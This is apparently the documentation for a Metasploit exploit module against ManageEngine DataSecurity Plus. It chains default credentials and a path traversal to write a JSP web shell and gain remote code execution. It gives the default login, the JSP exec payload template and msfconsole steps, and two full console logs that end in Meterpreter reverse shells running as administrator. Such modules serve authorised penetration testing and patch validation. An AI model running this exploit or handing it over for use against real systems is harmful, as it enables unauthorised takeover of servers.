## Vulnerable Application
This module exploits default credentials (CVE-2020-11532) and a path traversal vulnerability (CVE-2020-11531)
in the DataEngine Xnode server in ManageEngine DataSecurity Plus versions prior to 6.0.1 (6011).
These issues are chained in order to achieve remote code execution with local administrator privileges.

The module first tries to authenticate to the Xnode server using default credentials. If this works, it then requests the Xnode version.
If the target seems vulnerable based on the presence of default credentials and the Xnode version,
the module sends a custom `dr:/dr_schema_sync` action request to the Xnode server that exploits a path traversal vulnerability.

The `dr:/dr_schema_sync` action can be used to update the data repository (database) schema information that is stored in several JSON files
in the `<install_dir>\apps\dataengine-xnode\conf\datarepository\schema\` directory.
A valid `dr:/dr_schema_sync` request takes the form of a JSON hash (like all Xnode actions), containing a `dr_schema_list` key.
The value for this key is also a hash, which has as its keys the names of the data repository schema files,
and as its values, the contents of those JSON files.
For each schema filename, Xnode will open that file, or create it if it doesn't exist, and write the contents to it.

The vulnerability here is that the filenames can include directory traversal sequences like `..\`,
which makes it possible to write a file to directories other than `schema`, such as the web root at `<install_dir>\webapps\fap\`.
In addition, any file extension is allowed, including JSP.

The module exploits this issue by doing exactly that, namely exploiting the directory traversal vector to write a JSP file to the web root.
However, the file contents must be valid JSON, which limits the methods of delivering the payload.
The module overcomes this by following the PoC in delivering a payload as a byte array,
which is then converted to a string and passed to a `Runtime.getRuntime().exec()` call.
This sequence is written on a single line and wrapped in JSP scriptlet tags and then in quotes to make it valid JSON, like so:
`"<% Runtime.getRuntime().exec(new String(new byte[] {#{payload}})); %>"`
This initial payload is triggered via a simple HTTP GET request to the JSP file.

While this approach avoids the payload containing characters that require escaping in JSON, it is incompatible with
standard msf payloads and is also not a good match for command stagers, since it would result in the creation of
a great number of JSP files on the target.
The module therefore uses code from the `web_delivery` msf module to trigger delivery of the final payload via
a single, short command leveraging either PowerShell or Regsvr32, depending on the module configuration.

This module has been successfully tested against ManageEngine DataSecurity Plus version 6.0.1 (6010) running on Windows Server 2012.

## Installation Information
Please DM @wyntererik for information on how to obtain and install vulnerable software for testing.

## Verification Steps
1. Start msfconsole
2. Do: `use exploit/windows/http/manageengine_datasecurity_plus_traversal_rce`
3. Do: `set RHOSTS [IP]`
4. Do: `set LHOST [IP]`
5. Do: `set SRVHOST [IP]`
6. Do: `exploit`

## Options
### CUSTOM_PAYLOAD
Enable use of payloads other than `windows/x64/meterpreter/reverse_*`.
This option is disabled by default because during testing only `windows/x64/meterpreter/reverse_*` payloads resulted in a shell.
### RESTORE_SCHEMA_DIR
Upon successful exploitation, repopulate `<install_dir>\apps\dataengine-xnode\conf\datarepository\schema` with the default JSON files
### WEB_DELIVERY_VIA_PSH
If enabled (default), the module will use only Powershell (in memory) to deliver the payload.
If disabled, the Regsvr32 web delivery method is used.

## Scenarios
### ManageEngine DataSecurity Plus 6.0.1 (6010) on Windows Server 2012 - WEB_DELIVERY_VIA_PSH => true
```
msf6 > use exploit/windows/http/manageengine_datasecurity_plus_traversal_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > set rhosts 192.168.1.225
rhosts => 192.168.1.225
msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > options 

Module options (exploit/windows/http/manageengine_datasecurity_plus_traversal_rce):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   CUSTOM_PAYLOAD        false            no        Enable use of payloads other than windows/x64/meterpreter/reverse_*
   PASSWORD              chegan           yes       Password used to authenticate to the Xnode server
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RESTORE_SCHEMA_DIR    true             no        Upon successful exploitation, repopulate <datasecurity_install_dir>\apps\dataengine-xnode\conf\datarepository\schema with the default JSON files
   RHOSTS                192.168.1.225    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 8800             yes       The target port (TCP)
   SRVHOST               0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT               8080             yes       The local port to listen on.
   SSL                   false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                                no        The URI to use for this exploit (default is random)
   USERNAME              atom             yes       Username used to authenticate to the Xnode server
   VHOST                                  no        HTTP server virtual host
   WEB_DELIVERY_VIA_PSH  true             yes       If enabled (default), the module will use only Powershell (in memory) to deliver the payload. If disabled, the Regsvr32 web delivery method is used
   XNODE_PORT            29119            yes       The Xnode port


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   DataSecurity Plus

msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > run
[*] Exploit running as background job 4.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.1.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > 
[+] Successfully authenticated to the Xnode server
[*] Obtained Xnode installation path: 'C:\Program Files (x86)\ManageEngine\DataSecurity Plus\apps\dataengine-xnode'.
[+] The target appears to be vulnerable. Target is running Xnode version: XNODE_1_0_0
[*] Using URL: http://192.168.1.128:8080/UdYqreK
[*] Server started.
[*] Obtained expected Xnode "de_healh" status: "GREEN".

[!] This exploit will wipe the contents in the <datasecurity_install_dir>\apps\dataengine-xnode\conf\datarepository\schema directory.
[!] If that directory remains empty, Xnode will stop working and it will not be possible to reboot DataSecurity Plus.
[!] This module will try to repopulate the directory with the default JSON files, but that may impact functionality for a non-default configuration.
[*] Requesting JSP payload: http://192.168.1.225:8800/swkncbljpmmw.jsp
[+] Successfully requested JSP payload
[*] 192.168.1.225   manageengine_datasecurity_plus_traversal_rce - Delivering Payload (3675 bytes)
[*] Sending stage (200774 bytes) to 192.168.1.225
[+] We got a session! Please be patient while cleanpup is performed. This may take a while.
[*] Server stopped.
[+] Successfully removed the JSP payload from C:\Program Files (x86)\ManageEngine\DataSecurity Plus\webapps\fap\swkncbljpmmw.jsp.
[*] Attempting to repopulate apps\dataengine-xnode\conf\datarepository\schema with the default JSON files.
[+] Successfully uploaded the default Xnode datarepostiory schema files.
[*] Meterpreter session 5 opened (192.168.1.128:4444 -> 192.168.1.225:40192) at 2022-06-10 12:46:40 -0400

msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > sessions 5
[*] Starting interaction with 5...

meterpreter > shell
Process 2160 created.
Channel 29 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\ManageEngine\DataSecurity Plus\bin>whoami
whoami
lies\administrator
```
### ManageEngine DataSecurity Plus 6.0.1 (6010) on Windows Server 2012 - WEB_DELIVERY_VIA_PSH => false
```
msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > options 

Module options (exploit/windows/http/manageengine_datasecurity_plus_traversal_rce):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   CUSTOM_PAYLOAD        false            no        Enable use of payloads other than windows/x64/meterpreter/reverse_*
   PASSWORD              chegan           yes       Password used to authenticate to the Xnode server
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RESTORE_SCHEMA_DIR    true             no        Upon successful exploitation, repopulate <datasecurity_install_dir>\apps\dataengine-xnode\conf\datarepository\schema with the default JSON files
   RHOSTS                192.168.1.225    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 8800             yes       The target port (TCP)
   SRVHOST               0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT               8080             yes       The local port to listen on.
   SSL                   false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                                no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                                no        The URI to use for this exploit (default is random)
   USERNAME              atom             yes       Username used to authenticate to the Xnode server
   VHOST                                  no        HTTP server virtual host
   WEB_DELIVERY_VIA_PSH  false            yes       If enabled (default), the module will use only Powershell (in memory) to deliver the payload. If disabled, the Regsvr32 web delivery method is used
   XNODE_PORT            29119            yes       The Xnode port


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   DataSecurity Plus

msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > run
msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > 
[+] Successfully authenticated to the Xnode server
[*] Obtained Xnode installation path: 'C:\Program Files (x86)\ManageEngine\DataSecurity Plus\apps\dataengine-xnode'.
[+] The target appears to be vulnerable. Target is running Xnode version: XNODE_1_0_0
[*] Using URL: http://192.168.1.128:8080/JKxqtuT6N0SR
[*] Server started.
[*] Obtained expected Xnode "de_healh" status: "GREEN".

[!] This exploit will wipe the contents in the <datasecurity_install_dir>\apps\dataengine-xnode\conf\datarepository\schema directory.
[!] If that directory remains empty, Xnode will stop working and it will not be possible to reboot DataSecurity Plus.
[!] This module will try to repopulate the directory with the default JSON files, but that may impact functionality for a non-default configuration.
[*] Requesting JSP payload: http://192.168.1.225:8800/bqpmsuo.jsp
[+] Successfully requested JSP payload
[*] 192.168.1.225   manageengine_datasecurity_plus_traversal_rce - Delivering Payload (3696 bytes)
[*] Sending stage (200774 bytes) to 192.168.1.225
[+] We got a session! Please be patient while cleanpup is performed. This may take a while.
[*] Server stopped.
[+] Successfully removed the JSP payload from C:\Program Files (x86)\ManageEngine\DataSecurity Plus\webapps\fap\bqpmsuo.jsp.
[*] Attempting to repopulate apps\dataengine-xnode\conf\datarepository\schema with the default JSON files.
[+] Successfully uploaded the default Xnode datarepostiory schema files.
[*] Meterpreter session 4 opened (192.168.1.128:4444 -> 192.168.1.225:1215) at 2022-06-10 12:43:06 -0400

msf6 exploit(windows/http/manageengine_datasecurity_plus_traversal_rce) > sessions 4
[*] Starting interaction with 4...

meterpreter > shell
Process 3768 created.
Channel 29 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\ManageEngine\DataSecurity Plus\bin>whoami
whoami
lies\administrator
```
